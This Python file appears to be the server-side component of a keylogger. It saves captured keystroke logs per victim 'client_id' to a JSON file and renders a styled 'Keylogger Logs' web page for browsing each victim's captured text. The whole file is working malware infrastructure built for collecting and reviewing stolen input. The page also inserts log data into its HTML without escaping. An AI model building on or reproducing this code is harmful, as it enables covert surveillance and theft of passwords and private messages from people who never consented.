import json
import os
from pathlib import Path

clients = set()
data = {}
project_dir = Path(__name__).resolve().parent

def read_logs(url='storage/logs.json'):
    global data
    output = []

    file_url = project_dir / url

    print("FILE_URL: ", file_url)

    os.makedirs(os.path.dirname(file_url), exist_ok=True)
    
    try:
        with open(file_url, 'r') as file:
            try:
                local_data = json.load(file)
            except json.JSONDecodeError:
                print("Error: Invalid JSON format.")
                return []

            for key, value in local_data.items():
                output.append(str(value).strip())
                clients.add(key)
            data = local_data 

    except FileNotFoundError:
        print(f"Error: The file '{file_url}' was not found.")
        return "Error: Log file not found."
    except IOError:
        print(f"Error: Could not read the file '{file_url}'.")
        return "Error: Unable to read log file."
    
    return "\n".join(output)

def write_logs(new_data, url='storage/logs.json'):
    file_url = project_dir / url

    os.makedirs(os.path.dirname(file_url), exist_ok=True)

    try:
        if not os.path.exists(file_url):
            with open(file_url, 'w') as file:
                json.dump({}, file)

        with open(file_url, "r") as file:
            data = json.load(file)

        client_id = new_data['client_id']
        new_log_data = new_data['log_data']
        data[client_id] = new_log_data.strip()

        with open(file_url, "w") as file:
            json.dump(data, file, indent=4)
    except IOError:
        print(f"Error: Could not write to the file '{file_url}'.")

def get_html_template():
    client_options = "".join([f'<option value="{client}">{client}</option>' for client in clients])
    
    first_client_log = data.get(list(clients)[0], "No logs available") if clients else "No logs available"

    html_content = f"""<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Keylogger Logs</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
            body {{
                font-family: 'Orbitron', sans-serif;
                background-color: #0d1117;
                color: #00ff99;
                text-align: center;
                padding: 20px;
            }}
            .container {{
                max-width: 800px;
                margin: auto;
                background: #161b22;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0px 0px 15px rgba(0, 255, 153, 0.5);
            }}
            h1 {{
                color: #00ff99;
                text-shadow: 0 0 10px #00ff99;
                font-size: 2em;
            }}
            pre {{
                background: black;
                padding: 15px;
                border-radius: 5px;
                white-space: pre-wrap;
                font-family: monospace;
                text-align: left;
                box-shadow: inset 0px 0px 10px rgba(0, 255, 153, 0.3);
                border-left: 3px solid #00ff99;
            }}
            select {{
                background: #161b22;
                color: #00ff99;
                border: 1px solid #00ff99;
                padding: 5px;
                margin-bottom: 20px;
                font-size: 1em;
            }}
        </style>
        <script>
            function updateLog() {{
                var selectedClient = document.getElementById("client-select").value;
                var logs = {json.dumps(data)};
                document.getElementById("log-display").textContent = logs[selectedClient] || "No logs available";
            }}
        </script>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Keylogger Logs</h1>
            <label for="client-select">Select Client:</label>
            <select id="client-select" onchange="updateLog()">{client_options}</select>
            <pre id="log-display">{first_client_log}</pre>
        </div>
    </body>
    </html>"""
    
    return html_content